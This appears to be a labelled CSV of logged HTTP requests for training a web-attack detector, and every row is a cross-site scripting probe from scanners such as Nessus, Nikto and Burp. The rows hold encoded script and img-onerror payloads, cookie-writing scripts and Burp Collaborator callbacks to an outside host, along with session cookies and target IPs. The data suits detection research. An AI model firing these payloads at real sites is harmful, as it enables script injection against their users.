id,method,user_agent,url,refer,body,lable
3523,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/comersus_searchItem.asp%22%3E%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E,,,5
2788,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscoring.php?ContactId=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3C%22,,,5
4180,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/?page_id=2&%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
1104,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/create?c=%3C%2FBody%3E%3CiMG+id%3D%27LIOGDgkP%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdY%3E&i=%3C%2FBOdY%3E%3CIMg+id%3D%27aFeFQKWF%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdy%3E&t=YdinH%3CYdinH%3EYdinH%27YdinH%22YdinH%2FYdinH-YdinH&u=%3C%2FBODY%3E%3CimG+id%3D%27ZSfRtBMU%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDY%3E,https://api.bmac.com.cn:9092/,,5
3370,GET,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",/pan/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
259,GET,python-requests/2.18.4,/Activity/edit?id=30?title=%E4%BA%BA%E4%BA%BA%E9%83%BD%E6%98%AF%E7%BB%8F%E7%BA%AA%E4%BA%BA&start_time=2016-08-10+12%3A00%3A00&end_time=2016-09-21+00%3A00%3A00&image=88888&url=http://www.hacker.org/&detail=%3Cp%3E%E8%8A%B1%E6%A4%92%E7%BB%8F%E7%BA%AA%E4%BA%BA%E6%8B%9B%E5%8B%9F%26nbsp%3B%3C%2Fp%3E%3Cp%3E%E6%B4%BB%E5%8A%A8%E6%A6%82%E8%BF%B0+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80+%E3%80%80%26nbsp%3B%3C%2Fp%3E%3Cp%3E1%26gt%3B+%E6%B4%BB%E5%8A%A8%E7%9B%AE%E7%9A%84%EF%BC%9A%E6%8B%89%E6%96%B0%E7%94%A8%E6%88%B7%EF%BC%8C%E6%96%B0%E4%B8%BB%E6%92%AD%26nbsp%3B%3C%2Fp%3E%3Cp%3E2%26gt%3B+%E6%B4%BB%E5%8A%A8%E6%97%B6%E9%97%B4%EF%BC%9A8%E6%9C%881%E6%97%A512%E7%82%B9~9%E6%9C%8820%E6%97%A524%E7%82%B9%EF%BC%88%E5%BB%B6%E9%95%BF1%E5%A4%A9%E9%A2%86%E5%A5%96%E6%97%B6%E9%97%B4%EF%BC%8C9%E6%9C%8822%E6%97%A512%E7%82%B9%E4%B8%8B%E7%BA%BF%EF%BC%89%26nbsp%3B%3C%2Fp%3E%3Cp%3E3%26gt%3B+%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88&is_popup=0%3Cscript%3Ealert(42873)%3C/script%3E,,,5
4179,POST,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/amty-thumb-recent-post/amtyThumbPostsAdminPg.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E=1,,amty_hidden=1,5
783,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/f/'""()&%25<acx><ScRiPt%20>Q9sc(9639)<%2fScRiPt>",http://114.251.10.80/,"GET /f/'""()&%25<acx><ScRiPt%20>Q9sc(9639)<%2fScRiPt> HTTP/1.1 Referer: http://114.251.10.80/ Cookie: JSESSIONID=2956A011E5AFB1FA7B33D6DE630C3642;eiaweb.session.id=9d04a2977ad64085bc5c06d09c402de4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
3169,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/gCLGh/gCLGh?dt=%3C%2FbODY%3E%3CIMg+id%3D%27vKwuBBLd%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdy%3E,https://www.cndns.com/,,5
473,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/5bhprj6blrvz5fciwd7e4s0ej5pzdy1qsej66wulX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/5bhprj6blrvz5fciwd7e4s0ej5pzdy1qsej66wulX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
2875,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/login.php?mid=0&usr=admin%27%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
2810,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
4712,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx<img%20src=x%20onerror=alert(document.domain)>,,,5
3989,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),"/extmail/default/user.cgi?url="">%3Cscript%3Ealert(""gossamer_links_url_xss.nasl"")%3B%3C%2Fscript%3E&from=add",,,5
3570,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",/pan/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E,,,5
2775,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/webadmin/policy/group_table_ajax.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3032,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000737),/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x,,"<!--#include virtual=""/index.jsp""-->",5
2246,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/<script>cross_site_scripting.nasl</script>.fts,,,5
11,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/f0gzgtvla1k9up1slnwot2po8fe823qvhj8bv1jqX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/f0gzgtvla1k9up1slnwot2po8fe823qvhj8bv1jqX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
5,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/cgi-bin/<script>cross_site_scripting.nasl</script>.pl,,,5
3189,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/%3C/BODy%3E%3CiMg%20id=%27qfVHgYCF%27%20src=1%20onerror=%27prompt%281%29%27%3E%3CbODY%3E/%3C/BODy%3E%3CiMg%20id=%27qfVHgYCF%27%20src=1%20onerror=%27prompt%281%29%27%3E%3CbODY%3E/%3C/BODy%3E%3CiMg%20id=%27qfVHgYCF%27%20src=1%20onerror=%27prompt%281%29%27%3E%3CbODY%3E,https://ltb.bda.edu.cn/,,5
24,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/manager/loginController.htm?strbase64=%FF%FE%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%32%30%33%29%3C%2F%73%63%72%69%70%74%3E,,,5
1364,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000734),"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>",,"<!--#include virtual=""/index.jsp""-->",5
3809,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000730),/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>,,"<!--#include virtual=""/index.jsp""-->",5
4228,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
4308,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/hdw-tube/playlist.php?playlist=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
744,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/static/plugin/jo/'""()&%25<acx><ScRiPt%20>BbKK(9034)<%2fScRiPt>.js",http://114.251.10.109/,"GET /static/plugin/jo/'""()&%25<acx><ScRiPt%20>BbKK(9034)<%2fScRiPt>.js HTTP/1.1 Referer: http://114.251.10.109/ Cookie: COLLCK=3991785472;COLLCK=3991506020 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.109 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
1373,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000738),/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x,,"<!--#include virtual=""/index.jsp""-->",5
3137,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/url?hl=%3C%2FbODy%3E%3CImg+id%3D%27HxWZkdvT%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbODy%3E&pref=%3C%2FboDY%3E%3CIMg+id%3D%27WftCIgrA%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBODY%3E&pval=%3C%2FboDY%3E%3CImg+id%3D%27ulXGXDdr%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBODy%3E&q=%3C%2FBodY%3E%3CiMg+id%3D%27NZpyNejv%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDY%3E&sa=%3C%2FBoDY%3E%3CImg+id%3D%27XesfOSXJ%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdY%3E&usg=%3C%2FbOdY%3E%3CiMg+id%3D%27iAzCQNgL%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDy%3E&ust=%3C%2FbOdy%3E%3CImg+id%3D%27bUkvfmoI%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbODy%3E,,,5
406,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/public/images/products/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/75apjrt5xe3pccpyd2jbrey28tem2pqhh58xvnjcX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/,"GET /assets/public/images/products/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/75apjrt5xe3pccpyd2jbrey28tem2pqhh58xvnjcX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  ",5
738,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/docs/bootstrap/docs.min.js""%3B%30%47%79%49%78%0A%31%3C%53%63%52%69%50%74%3E%6B%38%79%72%28%39%30%33%36%29%3C%2F%53%63%52%69%50%74%3E",http://114.251.10.253/,"GET /v3/docs/bootstrap/docs.min.js""%3B%30%47%79%49%78%0A%31%3C%53%63%52%69%50%74%3E%6B%38%79%72%28%39%30%33%36%29%3C%2F%53%63%52%69%50%74%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
284,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/hvgrutct2iyx8f5ziw7yebylmcs5g14tvhm99zxoX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/hvgrutct2iyx8f5ziw7yebylmcs5g14tvhm99zxoX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
418,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/socket.io/?EIO=4&transport=polling&t=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fsgcauc4q8zeanx0jonuw2z9njep7dyimady4lw9lX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e,http://121.4.111.58:3000/,"GET /socket.io/?EIO=4&transport=polling&t=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fsgcauc4q8zeanx0jonuw2z9njep7dyimady4lw9lX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  ",5
3004,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/vothqsno.cfc?<script>cross_site_scripting.nasl</script>,,,5
1732,GET,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",/pan/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E,,,5
170,GET,python-requests/2.18.4,/phpMyAdmin-4.6.3-all-languages/tbl_sql.php?token=76c797df58c209b6f819a6a3205ecb2e&table=mlearning_upload_image&db=elearning%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
4597,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e,,,5
22,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/879a8t7z.nsf?<script>document.cookie=%22testrwxe=157;%22</script>,,,5
3515,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/forgetpwd.cgi?__mode=step2&cancel='><script>alert(111);</script>&cancel=Cancel&save=Submit&username=Q3Qon5F_,,,5
506,GET,"Mozilla/5.0 (Linux; Android 9; rv:75.0.3770.67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36",/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C,,"GET /plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C HTTP/1.1 Host: image.ftms.com.cn:80 User-Agent: Mozilla/5.0 (Linux; Android 9; rv:75.0.3770.67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",5
4002,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/?action=valid_login&vcode=<script>alert(G2f6578746d616e2f64656661756c742f3f616374696f6e3d76616c69645f6c6f67696e2676636f64653d3c7363726970743e616c657274282455524c24293b3c2f7363726970743e26757365726e616d653d2670617373776f72643d266e6f73616d6569703d2662616b65636f6f6b69653d323830353235);</script>&username=&password=&nosameip=&bakecookie=280525,,,5
144,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/g9qyn0xe1n7yglt7hbnkvn2bc2iw6n3bv2jtbg14qX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/g9qyn0xe1n7yglt7hbnkvn2bc2iw6n3bv2jtbg14qX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
694,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/static/'""()&%25<acx><ScRiPt%20>yuSg(9287)<%2fScRiPt>/JavaScript/dzan.js",http://114.251.10.80/,"GET /static/'""()&%25<acx><ScRiPt%20>yuSg(9287)<%2fScRiPt>/JavaScript/dzan.js HTTP/1.1 Referer: http://114.251.10.80/ Cookie: JSESSIONID=2956A011E5AFB1FA7B33D6DE630C3642;eiaweb.session.id=9d04a2977ad64085bc5c06d09c402de4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
1528,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003373),"/?\""><script>alert('Vulnerable');</script>",,dump_sql=foo,5
323,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/runtime.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fw1yefgput3ze81ln9rf0n3ur4iady8m0do7bxzmX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/,"GET /runtime.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fw1yefgput3ze81ln9rf0n3ur4iady8m0do7bxzmX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",5
50,GET,python-requests/2.18.4,/feeds-stat/trends_rn.php?src=llq&host=88888&series=hour_ctr&type=88888&chnl=Sum&df=2016-02-24&dt=2016-05-29%22%3E%3Cscript%3Ealert(42873)%3C/script%3E,,,5
1007,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0,/seniorSearch?lang=zh%22%3E%3Cscript%3Ealert(1111)%3C/script%3E,,,5
3528,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scriptssearch_results.dot?search_query=nessus%22%3e%3cscript%3ealert('dotcms_search_query_xss.nasl')%3c%2fscript%3e%2f,,,5
282,GET,python-requests/2.18.4,/Activity/config?id=13&guid=2dd1319dbdda887722c53fde1fdcf0fa&type=88888&time=88888&rand=0.2985629504546523%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
4315,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/META-INF?title=1%3C/title%3E%3CScRiPt%20%3Ealert('github')%3C/ScRiPt%3E,,,5
3967,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/60teglc6.cfc?<script>document.cookie=%22testlqex=3433;%22</script>,,,5
2850,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/adminimize/adminimize_page.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
